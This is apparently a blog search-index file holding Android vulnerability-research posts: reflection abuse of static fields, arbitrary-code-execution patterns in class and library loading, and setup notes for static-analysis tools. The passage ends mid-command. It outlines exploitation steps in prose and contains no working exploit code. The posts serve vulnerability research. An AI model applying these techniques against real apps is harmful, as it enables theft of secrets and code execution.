<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Android中不安全的静态变量使用</title>
      <link href="/2023/08/07/insecure-java-static-variable/"/>
      <url>/2023/08/07/insecure-java-static-variable/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞模式背景"><a href="#漏洞模式背景" class="headerlink" title="漏洞模式背景"></a>漏洞模式背景</h2><p>JAVA是一个挺神奇的面向对象的编程语言，它提供了一个<a href="https://www.oracle.com/technical-resources/articles/java/javareflection.html">反射机制</a>，通过该机制，可以：<br>1、获取一个指定的Class对象<br>2、获取指定类的所有字段–Field<br>3、获取指定类的所有构造方法 –constructor<br>4、获取指定类的所有非构造方法 –Method<br>这个特性原意可能仅仅是辅助开发人员有效地开发和自验证，从安全角度看，却提供了一个很好的漏洞利用方法。</p><h2 id="漏洞模式"><a href="#漏洞模式" class="headerlink" title="漏洞模式"></a>漏洞模式</h2><p>在Android中，如果应用程序，包括框架层，JAVA代码中如果使用了static定义成员变量，那么该变量的值总是可以被第三方应用获取，甚至修改，如果没有设置final属性的话。<br>遇到过以下的几种情形：<br>1、使用static变量存储密钥<br>2、使用static变量存储白名单<br>3、使用static变量存储路径<br>对于第一种，显然会导致敏感信息泄漏，对于第二和第三中情形，如果开发人员忘记设置final属性，那么攻击者可以通过发射机制修改，从而绕过白名单校验，路径校验等，严重的话甚至可以导致任意代码执行</p><h2 id="如何利用漏洞"><a href="#如何利用漏洞" class="headerlink" title="如何利用漏洞"></a>如何利用漏洞</h2><p>通常情况下，可以直接使用Class.forName获取相应的Class对象，然后通过该Class对象的getDeclaredField&#x2F;getDeclaredMethod等方法获取变量属性和成员方法，具体例子可以参考<a href="https://zhuanlan.zhihu.com/p/86293659">链接</a><br>这里，主要是指出两点：<br>如果目标类是在BOOTCLASSPATH这个环境变量下的JAR包，那么可以直接使用Class.forName获取类对象（BOOTCLASSPATH是所有应用classloader默认搜索路径）;<br>如果不是在该环境变量下的JAR包，那么可以这样操作：<br>1）在攻击APK的manifest.xml文件里添加queries属性，值是被攻击的包名<br>2）调用createPackageContext获取被攻击应用的context<br>3）调用Class.forName(“目标类名”，false，otherappcontext.getClassLoader())<br>对于成员变量，可以通过get获取值，通过set修改（前提是该staticn变量没有设置final属性）</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反射 </tag>
            
            <tag> 敏感信息泄漏和篡改 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于mariana-trench的批量静态分析和漏洞挖掘工具</title>
      <link href="/2023/08/03/MT-analyzer/"/>
      <url>/2023/08/03/MT-analyzer/</url>
      
        <content type="html"><![CDATA[<h2 id="MT-analyzer工具背景"><a href="#MT-analyzer工具背景" class="headerlink" title="MT_analyzer工具背景"></a>MT_analyzer工具背景</h2><p>在之前的博客里，说明如何源码编译Meta公司开源的maraina-trench静态污点分析工具（之所以需要源码编译，是因为pip安装的版本总是跟不上github上的最新版本），但该工具目前是不提供批量分析APK的，因此，我希望：<br>1、支持单独分析某一个指定的APK<br>2、支持批量对一个目录下的所有APK进行分析<br>3、支持自动从手机通过adb拉去所有应用（包括系统应用）到本地，然后进行批量分析<br>因此，有了这个工具。</p><h2 id="MT-analyzer工具的实现"><a href="#MT-analyzer工具的实现" class="headerlink" title="MT_analyzer工具的实现"></a>MT_analyzer工具的实现</h2><p>目前，工具还是非常简单的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">MT_Analyze tool is used to batch analyze apk based on mariana-trench \</span></span><br><span class="line"><span class="string">                                                 tool. So make sure you have installed mariana-trench firstly</span></span><br><span class="line"><span class="string">USAGE:</span></span><br><span class="line"><span class="string">     1 analyze one apk by the param &quot;-a&quot; or &quot;--apk&quot;,or</span></span><br><span class="line"><span class="string">     2 analyze all the apks in a directory by the param &quot;-d&quot; or &quot;--dir&quot;,or</span></span><br><span class="line"><span class="string">     3 analyze all the apk in the phone,which will be pulled out to the local directory by adb. In this case, please use</span></span><br><span class="line"><span class="string">       param &quot;-s&quot; or &quot;--usb&quot;.make sure you have installed adb tools and have connected to the target phone. Also, the</span></span><br><span class="line"><span class="string">       full path of adb tool must set in the @PATH environment variable.</span></span><br><span class="line"><span class="string">     Because the tool is based on mariana-trench(https://github.com/facebook/mariana-trench),so you must install</span></span><br><span class="line"><span class="string">     mariana-trench before, such as &quot;pip install mariana-trench&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> current_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_all_apks</span>(<span class="params">apks_dir</span>):</span><br><span class="line">    <span class="keyword">for</span> root, ds, files <span class="keyword">in</span> os.walk(apks_dir):</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">            <span class="keyword">if</span> file.endswith(<span class="string">&#x27;.apk&#x27;</span>):</span><br><span class="line">                apk_path = os.path.join(root, file)</span><br><span class="line">                <span class="keyword">yield</span> apk_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_one_apk_by_mariana_trench</span>(<span class="params">apk_path</span>):</span><br><span class="line">    dir_name, full_file_name = os.path.split(apk_path)</span><br><span class="line">    file_name, file_ext = os.path.splitext(full_file_name)</span><br><span class="line">    <span class="keyword">if</span> file_ext == <span class="string">&quot;.apk&quot;</span>:</span><br><span class="line">        out_directory = dir_name + <span class="string">&quot;/&quot;</span> + file_name</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(out_directory):</span><br><span class="line">            os.makedirs(out_directory)</span><br><span class="line">        cmd = <span class="string">&quot;mariana-trench --apk-path=&quot;</span> + apk_path + <span class="string">&quot; --output-directory=&quot;</span> + out_directory</span><br><span class="line">        result = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, text=<span class="literal">True</span>).communicate()</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">        cmd = <span class="string">&quot;sapp --tool=mariana-trench --database-name=&quot;</span> + out_directory + <span class="string">&quot;/sapp.db&quot;</span> + <span class="string">&quot; analyze &quot;</span> + out_directory</span><br><span class="line">        result = result = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE,text=<span class="literal">True</span>).communicate()</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_by_mariana_trench</span>(<span class="params">apks_dir</span>):</span><br><span class="line">    apks = find_all_apks(apks_dir)</span><br><span class="line">    <span class="keyword">for</span> apk <span class="keyword">in</span> apks:</span><br><span class="line">        analyze_one_apk_by_mariana_trench(apk)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pull_aks_from_phone_by_adb</span>(<span class="params">apks_dir</span>):</span><br><span class="line">    outs_data = subprocess.Popen(<span class="string">&#x27;adb shell pm list package -f&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">    packages = outs_data.stdout.readlines()</span><br><span class="line">    package_list = []</span><br><span class="line">    <span class="keyword">for</span> package <span class="keyword">in</span> packages:</span><br><span class="line">        package = package.strip()</span><br><span class="line">        <span class="keyword">if</span> package:</span><br><span class="line">            package_list.append(package)</span><br><span class="line">    <span class="keyword">if</span> package_list <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> package <span class="keyword">in</span> package_list:</span><br><span class="line">            temp = package.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            path = temp.rsplit(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">            package_name = temp.rsplit(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">            cmd = <span class="string">&quot;adb pull &quot;</span> + path + <span class="string">&quot; &quot;</span> + apks_dir + <span class="string">&quot;//&quot;</span> + package_name + <span class="string">&quot;.apk&quot;</span></span><br><span class="line">            result = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_enter</span>():</span><br><span class="line">    <span class="keyword">global</span> current_path</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;MT_Analyze tool is used to batch analyze apk based on mariana-trench \</span></span><br><span class="line"><span class="string">                                                 tool. So make sure you has install mariana-trench firstly&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-d&quot;</span>, <span class="string">&quot;--dir&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;dir where the apks to analyzed&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;--apk&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;the full path of apk to analyzed&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--usb&quot;</span>, required=<span class="literal">False</span>, <span class="built_in">type</span>=<span class="built_in">bool</span>, <span class="built_in">help</span>=<span class="string">&quot;adb is used to collect all the apk \</span></span><br><span class="line"><span class="string">                                                                    pulled from phone&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    input_dir = args.<span class="built_in">dir</span></span><br><span class="line">    apk_path = args.apk</span><br><span class="line">    is_used_adb_to_pull_apks = args.usb</span><br><span class="line">    current_path = os.path.abspath(sys.argv[<span class="number">0</span>])</span><br><span class="line">    work_path = current_path.rpartition(<span class="string">&quot;/&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_dir <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> apk_path <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> is_used_adb_to_pull_apks == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;input dir and apk is not set ,try to use adb pull apk from phone&quot;</span>)</span><br><span class="line">        apks_dir = work_path + <span class="string">&quot;//&quot;</span> + <span class="string">&quot;APKs&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(apks_dir):</span><br><span class="line">            os.makedirs(apks_dir)</span><br><span class="line">        pull_aks_from_phone_by_adb(apks_dir)</span><br><span class="line">        analyze_by_mariana_trench(apks_dir)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> apk_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        analyze_one_apk_by_mariana_trench(apk_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_dir <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        analyze_by_mariana_trench(input_dir)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    analyze_enter()</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All time used for analyze is:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(end_time - start_time) + <span class="string">&quot; s&quot;</span>)</span><br></pre></td></tr></table></figure><p>注意，MT_analyzer目前仅支持linux平台。<br>具体源码托管在<a href="https://github.com/Securee/MT_analyzer/tree/main">github上</a></p><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><p>其实我的原意是想达到以下的效果：<br>1）静态污点分析<br>   –基于mariana-trench<br>2) 动态分析<br>   参考<a href="https://github.com/sensepost/objection">objection</a>,<a href="https://github.com/Ch0pin/medusa">medusa</a><br>3) 逻辑漏洞挖掘<br>   基于Jandroid工具<br>   但目前，还是想根据已有的漏洞模式，在mariana-trench的现有规则上补充完备，再慢慢完善工具。</p>]]></content>
      
      
      <categories>
          
          <category> 工具脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态分析 </tag>
            
            <tag> MT_analyzer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android中的任意代码执行漏洞</title>
      <link href="/2023/08/01/android-arbitrary-code-execution/"/>
      <url>/2023/08/01/android-arbitrary-code-execution/</url>
      
        <content type="html"><![CDATA[<h2 id="关于任意代码执行漏洞"><a href="#关于任意代码执行漏洞" class="headerlink" title="关于任意代码执行漏洞"></a>关于任意代码执行漏洞</h2><p>与任意命令执行漏洞类似，但任意代码执行不仅仅可以执行系统中已经存在的命令，还可以执行攻击者指定的代码（这通常通过执行一段shellcode，或者加载执行攻击者编写的一个二进制文件，比如可执行文件，动态库等）。<br>在Android中，也会有类似的漏洞。</p><h2 id="Android中的任意代码执行漏洞"><a href="#Android中的任意代码执行漏洞" class="headerlink" title="Android中的任意代码执行漏洞"></a>Android中的任意代码执行漏洞</h2><p>1、应用程序加载的动态库可被攻击者控制<br>   应用程序基于各种业务需求，通常会将一些公共功能，尤其是涉及性能方面的，在一个动态库so里实现，比较，文件解析，媒体编解码，通信，加解密。这种情况下，通常是使用了JNI技术，最后通过System.load&#x2F;System.loadLibrary加载相应的动态库。<br>   其中，System.load输入的是动态库的绝对路径，可以是任意路径（当然前提是该应用有访问权限）;而System.loadLibrary的参数是动态库的文件名，不包括扩展名，比如动态库libtest.so,则只需调用System.loadLibrary(“test”)即可。<br>   对于System.loadLibrary稍微展开一下：由于不是路径，而只是一个动态库文件名，那么必然会涉及文件搜索的过程，是否会存在Window平台下的动态库劫持问题呢？<br>   System.loadLibrary(String libName)  –&gt; Runtime.getRuntime().loadLibrary(libName, VMStack.getCallingClassLoader())<br>   这里因为涉及比较复杂的代码分析，因此仅是总结以下：默认先从应用安装目录下lib文件夹搜索，如果没找到，就到一个系统变量：java.library.path中查找，一般情况下，该系统变量值是：&#x2F;system&#x2F;lib和&#x2F;vendor&#x2F;lib。因此要实现动态库劫持，最佳方法是利用其它漏洞篡改应用安装目录下的动态库</p><p>2、DexClassLoader路径可被攻击者控制<br>   DexClassLoader是用于加载外部的类，比如一些插件，是动态从网络的服务器下载然后load到应用的进程空间。<br>   DexClassLoader(String dexPath, String optimizedDirectory, String librarySearchPath, ClassLoader parent)<br>   如果第一个参数dexPath是攻击者可以控制的，那么就可以令应用程序加载攻击者指定的dex，实现任意代码执行。<br>   第二个参数是一个缓存目录，一般是沙箱内的私有目录<br>   第三个是dex可能需要依赖so搜索路径<br>   第四个参数是父类加载器</p><p>3、createPackageContext的包名可被攻击者控制或者绕过<br>   应用程序可能需要获取其它应用的接口，包括Java的方法，应用的资源等。由于其它应用Java的方法是不能直接loadclass的，因此其它应用的classloader与当期应用的classloader不一样，因此需要先通过createaPackgeContext将应用load到内存，获得context后，再getClassloder，最后通过loader来loadClass。这里可能存在几个可能的漏洞模式：<br>   1）createPackageContext第一个参数，也即是packageName是攻击者完全可控<br>      攻击者可以伪造按照该packageName的应用，被动等待，一旦受害者应用调用了该接口，哪怕仅是调用getClassloader都可以触发任意代码执行：<br>      <img src="/2023/08/01/android-arbitrary-code-execution/createPackageContext.png" class title="createPackageContext"><br>   2）packageName的校验可被绕过<br>      比如使用startWith，endWith，contain，indexof，这些方法很容易被绕过<br>      具体的漏洞模式解释，可以<a href="https://blog.oversecured.com/Android-arbitrary-code-execution-via-third-party-package-contexts/">参考这个博客</a></p><h2 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h2><p>下一步需要制定漏洞扫描的规则，通过静态污点分析工具批量扫描应用。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Androi </tag>
            
            <tag> 任意代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞挖掘工具Jandroid搭建</title>
      <link href="/2023/06/25/Jandroid-setup/"/>
      <url>/2023/06/25/Jandroid-setup/</url>
      
        <content type="html"><![CDATA[<h2 id="关于Jandroid工具"><a href="#关于Jandroid工具" class="headerlink" title="关于Jandroid工具"></a>关于Jandroid工具</h2><p>Jandroid是<a href="https://labs.withsecure.com/home">withSecure</a>实验室推出的一个<a href="https://labs.withsecure.com/publications/automating-pwn2own-with-jandroid">开源工具</a>。这个工具原来是该实验室为了在Pwn20wn中挖掘从浏览器发起的攻击利用链，是一个逻辑漏洞挖掘工具。Android的静态分析工具中，该工具不算是最出色的，而且目前已经三年没有更新了，但是发现该工具有以下4个优点，所以想花一点时间去了解一下：<br>1、支持从批量的APK中查找漏洞链，比如可以将手机的APK导出到一个目录，进行批量分析<br>2、提供GUI界面进行规则编辑<br>3、同时支持manifest和代码中漏洞查找<br>4、支持GUI展示漏洞形成的调用链<br>要想了解该工具，搭建该工具的环境无疑是第一步。</p><h2 id="搭建Jandroid环境"><a href="#搭建Jandroid环境" class="headerlink" title="搭建Jandroid环境"></a>搭建Jandroid环境</h2><p>1、虚拟机环境<br>和其它工具类似，这里也是使用ubuntu的虚拟机进行搭建，版本选择18.04（同样的理由，使用其它版本可能会遇到各种兼容的问题）。</p><p>2、安装JDK8</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openjdk-8-jdk</span><br></pre></td></tr></table></figure><p>确认当期的java版本是1.8</p><img src="/2023/06/25/Jandroid-setup/install-jdk8.png" class title="install-jdk8"><p>确认当期python版本是python3：</p><img src="/2023/06/25/Jandroid-setup/install-python37.png" class title="install-jdk8"><p>ubuntu 18.04默认安装的python3版本是3.6.9,但是相应的pip没有安装，需要执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure><p>3、下载Jandroid的源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/WithSecureLabs/Jandroid.git</span><br></pre></td></tr></table></figure><p>修改requirements.txt文件：</p><img src="/2023/06/25/Jandroid-setup/modify-requirement.png" class title="modify-requirement"><p>将neo4j注释掉，因为这个工具需要手工安装，而androguard则将版本3.3.5删除（不需要指定版本）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd Jandroid</span><br><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure><p>在安装以上依赖过程中，可能会出现各种依赖问题，这时候仔细查看错误原因，一般都可以找到解决方法，比如安装pillow提示：</p><img src="/2023/06/25/Jandroid-setup/install-pillow-fail.png" class title="install-pillow-fail"><p>根据官网提示，安装相应依赖即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libtiff5-dev libjpeg8-dev libopenjp2-7-dev zlib1g-dev \</span><br><span class="line">    libfreetype6-dev liblcms2-dev libwebp-dev tcl8.6-dev tk8.6-dev python3-tk \</span><br><span class="line">    libharfbuzz-dev libfribidi-dev libxcb1-dev</span><br></pre></td></tr></table></figure><p>安装neo4j 3.1.7版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -</span><br><span class="line">echo &#x27;deb https://debian.neo4j.com stable legacy&#x27; | sudo tee /etc/apt/sources.list.d/neo4j.list #注意要输入root的密码</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install neo4j=3.1.7</span><br></pre></td></tr></table></figure><h2 id="启动Jandroid"><a href="#启动Jandroid" class="headerlink" title="启动Jandroid"></a>启动Jandroid</h2><p>如果以上一切正常的话，可以尝试启动Jandroid</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd Jandroid/gui</span><br><span class="line">python3 jandroid_gui.py</span><br></pre></td></tr></table></figure><p>如果启动失败，提示：</p><img src="/2023/06/25/Jandroid-setup/jandroid-start-fail.png" class title="jandroid-start-fail"><p>那么则，需要u执行以下命令，安装相应的依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3-tk</span><br></pre></td></tr></table></figure><p>如果提示找不到idlelib’，则</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install idle3</span><br></pre></td></tr></table></figure><p>此时，Jandroid终于可以运行起来：</p><img src="/2023/06/25/Jandroid-setup/jandroid-start-succ.png" class title="jandroid-start-succ"><h2 id="Jandroid配置"><a href="#Jandroid配置" class="headerlink" title="Jandroid配置"></a>Jandroid配置</h2><p>如果不使用GUI查看漏洞链的话，可以直接一般不需要进行其它特别配置，但是如果使用neo4j的话，则需要配置neo4j，主要是帐号密码：</p><img src="/2023/06/25/Jandroid-setup/neo4j-config.png" class title="neo4j-config"><p>默认情况下，neo4j的帐号密码都是neo4j，通过浏览器打开：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:7474</span><br></pre></td></tr></table></figure><p>会提示修改密码，这里将密码修改为neo3j，点击启动界面中的Advanced configuration按钮，打开配置文件，直接修改，然后保存即可。</p><h2 id="运行Jandroid进行分析"><a href="#运行Jandroid进行分析" class="headerlink" title="运行Jandroid进行分析"></a>运行Jandroid进行分析</h2><p>Jandroid默认提供了一个简单的规则，可以将带测试的APK拷贝到指定的目录或者在Jandroid界面上指定APK所在的目录，然后点击开始分析。<br>这个过程中，可能会报错：</p><img src="/2023/06/25/Jandroid-setup/jandroid-run-fail.png" class title="jandroid-run-fail"><p>这是因为系统中，没有存在python这个命令，但是存在python3,因此，可以建立一个软连接来解决这个问题：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /usr/bin/python3 /usr/bin/python</span><br></pre></td></tr></table></figure><p>这样之后，就可以进行漏洞挖掘了：</p><img src="/2023/06/25/Jandroid-setup/jandroid-run-succ.png" class title="jandroid-run-succ"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>与其它静态分析工具类似，如何准确地编写规则是挖掘到漏洞的关键，此外，该工具的分析速度稍微有点慢，如果使用配置强劲的物理机应该会有速度的提升。</p>]]></content>
      
      
      <categories>
          
          <category> 工具脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jandroid </tag>
            
            <tag> 静态分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>源码编译mariana-trench</title>
      <link href="/2023/06/16/mariana-trench-build/"/>
      <url>/2023/06/16/mariana-trench-build/</url>
      
        <content type="html"><![CDATA[<h2 id="关于mariana-trench静态分析工具"><a href="#关于mariana-trench静态分析工具" class="headerlink" title="关于mariana trench静态分析工具"></a>关于mariana trench静态分析工具</h2><p>mariana trench是facebook，也即是现在的Meta公司开源的一款用于Android的静态分析工具，支持有源码和无源码两种方式的分析，详细使用可以看官网的<a href="https://mariana-tren.ch/">介绍</a>,源码在github上<a href="https://github.com/facebook/mariana-trench">开源</a>.<br>其它同类的工具还有<a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">Mobile-Security-Framework-MobSF</a>、<a href="https://soot-oss.github.io/soot/">Soot</a>、<a href="https://github.com/bytedance/appshark">appshark</a>、<a href="https://github.com/WithSecureLabs/Jandroid">Jandroid</a>。<br>mariana trench在有源码的情况下，会比较明显指出漏洞所在的代码，无源码的情况下，通常需要更多的人工分析确认。与Soot、appshark、Jandroid一样，mariana trench最大的特点就是静态污点分析，通过预置和自定义的规则查找满足一定模式的漏洞。<br>经过一段时间的使用，mariana trench有3个比较明显的缺陷：<br>1）主要是基于源码（反编译后的）进行污点分析，但是对于漏洞模式是出现在manifest配置的漏洞则无法制定相应的规则;<br>2）与其它几款污点分析工具类似，也不支持对jar包进行分析，需要一些工具将jar转化为apk;<br>3）默认情况下，不支持对批量的apk进行分析，需要自行编写脚本进行批量分析apk。<br>此外，学习曲线也比较陡，需要充分理解规则里的各个字段的含义，否在即使知道了漏洞的模式，也不知道该怎么写规则。</p><h2 id="源码编译"><a href="#源码编译" class="headerlink" title="源码编译"></a>源码编译</h2><p>事实上，如果只是想尝试或者简单地使用工具，并不需要源码编译生成工具，而只需简单地几条命令即可安装:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3 python3-pip python3-venv</span><br><span class="line">python3 -m venv ~/.venvs/mariana-trench</span><br><span class="line">source ~/.venvs/mariana-trench/bin/activate</span><br><span class="line">pip install mariana-trench</span><br><span class="line">pip install fb-sapp</span><br></pre></td></tr></table></figure><p>但是如果想修改源码，获得更大的定制自由度，则有需要进行源码编译，同时，pypi上的版本跟不上github的更新也是一个原因。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>推荐使用虚拟机，而且是ubuntu 20.04的虚拟机环境，这也是官方测试使用的环境，如果使用其它版本的ubuntu，可能会出现各种编译失败的错误，尤其是低版本的ubuntu。<br>自行使用Virtual Box或者VMware搭建ubuntu 20.04的虚拟机环境。<br>友情提醒：搭建好虚拟机环境后，立即做一个虚拟机镜像保存，不然后续安装了一大堆软件后，还是编译失败，要去定位是哪个软件包引起的话很耗费时间，直接还原镜像最快。</p><h3 id="准备依赖的软件包"><a href="#准备依赖的软件包" class="headerlink" title="准备依赖的软件包"></a>准备依赖的软件包</h3><p>官方的指导文档可能是没有及时更新，如果按照官方的指导进行，很可能编译失败。<br>以下我的编译过程：<br>注意：在执行以下步骤之前，我的ubuntu已经安装了gcc&#x2F;g++ 10</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-10 g++-10</span><br></pre></td></tr></table></figure><p>并将gcc 10作为默认的编译器。</p><p>1、安装brew 工具，并更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c 